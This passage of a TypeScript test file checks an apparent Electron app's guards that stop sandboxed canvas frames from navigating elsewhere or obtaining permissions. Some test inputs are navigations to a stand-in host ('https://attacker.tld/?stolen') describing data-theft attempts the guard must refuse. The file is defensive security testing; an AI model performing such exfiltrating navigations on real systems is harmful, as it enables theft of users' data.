    installCanvasFrameNavigationGuard({
      on(event, fn) {
        expect(event).toBe('will-frame-navigate')
        listener = fn
        return undefined
      },
    })
    expect(listener, 'guard registered no listener').toBeTruthy()
    return listener!
  }

  function fire(over: Partial<CanvasFrameNavigationDetails>): { prevented: boolean } {
    const listener = install()
    let prevented = false
    listener({
      url: 'ccc-ux://bbbbbbbbbbbbbbbbbbbbbbbb/v1/index.html',
      isMainFrame: false,
      frame: { url: 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v1/index.html' },
      preventDefault: () => {
        prevented = true
      },
      ...over,
    })
    return { prevented }
  }

  it('cancels a subframe navigation to another canvas', () => {
    expect(fire({}).prevented).toBe(true)
  })

  it('allows a navigation that stays inside the frame\'s own version', () => {
    expect(fire({ url: 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v1/deep/route' }).prevented).toBe(false)
  })

  it('still refuses when `frame` is null, using the initiator — a nullable-only input is an off switch', () => {
    const out = fire({
      frame: null,
      initiator: { url: 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v1/index.html' },
    })
    expect(out.prevented).toBe(true)
  })

  it('refuses when NEITHER source url exists — no information is not permission', () => {
    // The loop used to fall through to "allowed" here: both sources absent, so
    // nothing was ever compared and the navigation proceeded. That is the one
    // case where the guard knows nothing about who is navigating, which is
    // precisely when it must not decide in the navigation's favour. The catch
    // below fails closed on a THROW; this was not a throw.
    expect(fire({ frame: null, initiator: null }).prevented).toBe(true)
    expect(fire({ frame: undefined, initiator: undefined }).prevented).toBe(true)
    expect(fire({ frame: { url: undefined }, initiator: { url: undefined } }).prevented).toBe(true)
  })

  // Finding #4 of the re-attack. An EMPTY source url used to be counted as an
  // ALLOWING source, on the reasoning that '' is "only" a frame with no
  // committed document, i.e. the pane's mount. An uncommitted SUBFRAME of a
  // canvas document reports '' as well, so that reasoning handed it a free
  // first hop. '' is now no information, and the allowance is narrowed to the
  // mount's own shape rather than removed — which is what keeps the pane from
  // going permanently blank.
  const APP = 'file:///C:/app/index.html'
  const CANVAS_A = 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v1/index.html'

  it('allows an empty url ONLY as the canvas pane\'s own mount: app parent, canvas target', () => {
    // The shape both mount sites have — the pane's iframe and the off-screen
    // capture frame are direct children of the app's own document.
    expect(fire({ frame: { url: '', parent: { url: APP } }, initiator: null }).prevented).toBe(false)
    expect(fire({ frame: { url: '', parent: { url: 'http://localhost:5173/' } }, initiator: null }).prevented).toBe(
      false,
    )
  })

  it('refuses an uncommitted SUBFRAME of a canvas document — same empty url, different parent', () => {
    // A src-less <iframe> a canvas page created. Off the scheme entirely…
    expect(
      fire({
        frame: { url: '', parent: { url: CANVAS_A } },
        initiator: null,
        url: 'https://attacker.tld/?stolen',
      }).prevented,
    ).toBe(true)
    // …and to another canvas, which is the window.name theft shape.
    expect(fire({ frame: { url: '', parent: { url: CANVAS_A } }, initiator: null }).prevented).toBe(true)
  })

  it('refuses an empty url with nothing to vouch for it, and one that is not a mount', () => {
    expect(fire({ frame: { url: '' }, initiator: null }).prevented).toBe(true)
    expect(fire({ frame: { url: '', parent: null }, initiator: null }).prevented).toBe(true)
    expect(fire({ frame: { url: '', parent: { url: '' } }, initiator: null }).prevented).toBe(true)
    // A mount goes INTO a canvas version; a first hop anywhere else is not one.
    expect(
      fire({ frame: { url: '', parent: { url: APP } }, initiator: null, url: 'https://attacker.tld/' }).prevented,
    ).toBe(true)
  })

  it('answers from the OTHER source when there is one — an empty url never overrode it', () => {
    // Why dropping '' can only change the outcome when it was the ONLY source:
    // the loop refuses if ANY source refuses, so an allowing '' never decided
    // anything on its own.
    expect(fire({ frame: { url: '' }, initiator: { url: CANVAS_A } }).prevented).toBe(true)
    expect(fire({ frame: { url: '' }, initiator: { url: APP } }).prevented).toBe(false)
  })

  it('leaves the main frame to will-navigate', () => {
    expect(fire({ isMainFrame: true }).prevented).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// Permission requests
// ---------------------------------------------------------------------------

describe('installCanvasPermissionGuard', () => {
  function install(): {
    request: (permission: string, requestingUrl?: string) => boolean
    check: (permission: string, origin: string) => boolean
  } {
    let requestHandler: any = null
    let checkHandler: any = null
    installCanvasPermissionGuard({
      setPermissionRequestHandler: (h) => {
        requestHandler = h
      },
      setPermissionCheckHandler: (h) => {
        checkHandler = h
      },
    })
    expect(requestHandler, 'no permission request handler installed').toBeTruthy()
    expect(checkHandler, 'no permission check handler installed').toBeTruthy()
    return {
      request: (permission, requestingUrl) => {
        let granted: boolean | undefined
        requestHandler(null, permission, (g: boolean) => {
          granted = g
        }, { requestingUrl })
        expect(granted, 'handler never answered').toBeTypeOf('boolean')
        return granted!
      },
      check: (permission, origin) => checkHandler(null, permission, origin),
    }
  }

  it('denies every permission a canvas document asks for', () => {
    const { request } = install()
    for (const permission of ['geolocation', 'media', 'midi', 'clipboard-read', 'notifications', 'idle-detection']) {
      expect(request(permission, 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v1/index.html'), permission).toBe(false)
    }
  })

  it('denies the synchronous check for a canvas origin too', () => {
    const { check } = install()
    expect(check('media', 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa')).toBe(false)
  })

  it('does NOT deny the app\'s own renderer — the Copy buttons go through this handler', () => {
    // A blanket `() => false` closes the canvas hole by breaking
    // navigator.clipboard.write everywhere in the app.
    const { request, check } = install()
    expect(request('clipboard-sanitized-write', 'file:///C:/app/index.html')).toBe(true)
    expect(request('clipboard-sanitized-write', 'http://localhost:5173/')).toBe(true)
    expect(check('clipboard-sanitized-write', 'http://localhost:5173')).toBe(true)
  })

  it('denies a request that carries no requesting url only when it is a canvas one', () => {
    const { request } = install()
    // Unknown origin is the app's own window in practice; the canvas frames
    // always report theirs. Documented rather than silently either way.
    expect(request('geolocation', undefined)).toBe(true)
  })
})
